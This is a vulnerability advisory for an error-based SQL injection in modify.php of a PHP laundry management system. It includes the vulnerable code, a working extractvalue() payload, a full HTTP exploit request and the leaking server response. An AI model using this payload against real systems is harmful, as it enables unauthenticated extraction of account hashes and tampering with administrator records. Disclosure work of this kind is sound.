## SIMPLE_LAUNDRY_SYSTEM modify.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `citizenNumber` parameter of `modify.php` — together with the other profile fields submitted by the staff edit form — is concatenated into an `UPDATE` statement without escaping, and the script echoes the raw MySQL error message back to the client when the statement fails. An attacker can therefore wrap any subquery in `extractvalue()` and read its result directly from the HTTP response, which allows the database name, the table list and the account hashes of the `member` and `staff` tables to be extracted. The script performs no authentication check and no ownership check, so an unauthenticated attacker can also rewrite the profile of any staff account, including the administrator.

### II. Source Code Analysis

The vulnerability resides in `modify.php`, lines 3-20:

```php
$firstName = $_POST['firstName'];
$lastName = $_POST['lastName'];
$gender = $_POST['gender'];
$citizenNo = $_POST['citizenNumber'];
$dateOfBirth  = $_POST['dateOfBirth'];
$mobileNumber = $_POST['mobileNumber'];
$address = $_POST['address'];
$email = $_POST['email'];
$staffId = $_POST['staffId'];

...
echo $staffId;

  $q = "update staff set firstName='$firstName', lastName='$lastName', citizenNo='$citizenNo', dateOfBirth='$dateOfBirth', mobileNo='$mobileNumber', address='$address', email='$email', gender='$gender' where staffId =$staffId";

  if(!$mysqli->query($q)){
  echo "Update failed: ". $mysqli->error;
  }else{
  header("Location: staffmanagement.php");
  }
```

Nine values taken from `$_POST` are written into the `SET` clause, each inside single quotes and with no `mysqli_real_escape_string()` and no prepared statement, so a quote in any of them closes its literal and the remainder is parsed as SQL. `$staffId` is used unquoted in `where staffId =$staffId`, which makes that parameter injectable as well without needing a quote.

Line 20 echoes `$mysqli->error` into the page whenever the query fails, so a function that raises an error containing the result of an expression — `extractvalue()` or `updatexml()` — turns the handler into a direct data extraction channel. The stray `echo $staffId;` on line 14 additionally reflects the identifier into the body before the update runs, which is a separate information leak and the reason every response is prefixed with the submitted id.

The file only requires `connect.php`; there is no `session_start()` and no session check, so the statement runs for any request that reaches it.

### III. Payload

The core injection payload is:

```
1234'and/**/extractvalue(1,concat(char(126),md5(1417503137)))and'
```

The resulting SQL statement executed by the server becomes:

```sql
update staff set firstName='admin', lastName='admin', citizenNo='1234'and/**/extractvalue(1,concat(char(126),md5(1417503137)))and'', dateOfBirth='2018-11-10', mobileNo='admin', address='admin', email='admin@gmail.com', gender='M' where staffId =12
```

The leading `1234'` closes the `citizenNo` literal, `/**/` replaces the spaces so the payload survives URL handling, `extractvalue()` receives a malformed XPath made of `char(126)` (`~`) followed by the expression to be read, and the trailing `and'` restores the quote that the PHP template appends. MySQL evaluates the argument, then rejects the XPath and repeats it inside the error message, so the value — the MD5 of `1417503137` here — is returned to the client.

```
POST /modify.php HTTP/1.1
Host: bbn
Content-Length: 235
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://bbn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/modstaffinfo.php?userid=12
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive

firstName=admin&lastName=admin&gender=M&citizenNumber=1234'and/**/extractvalue(1,concat(char(126),md5(1417503137)))and'&dateOfBirth=2018-11-10&mobileNumber=admin&address=admin&email=admin%40gmail.com&staffId=12&staffModifySubmit=Submit
```

The response echoes the evaluated expression inside the MySQL error message, which proves that the injected SQL was executed and that arbitrary query results can be read from the page. The `12` in front of the message is the identifier printed by the debug `echo` on line 14:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:35:54 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Content-Length: 71

12Update failed: XPATH syntax error: '~9eef8c68a80ec3044ec7759862cae53'
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030173817802](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030173817802.png)
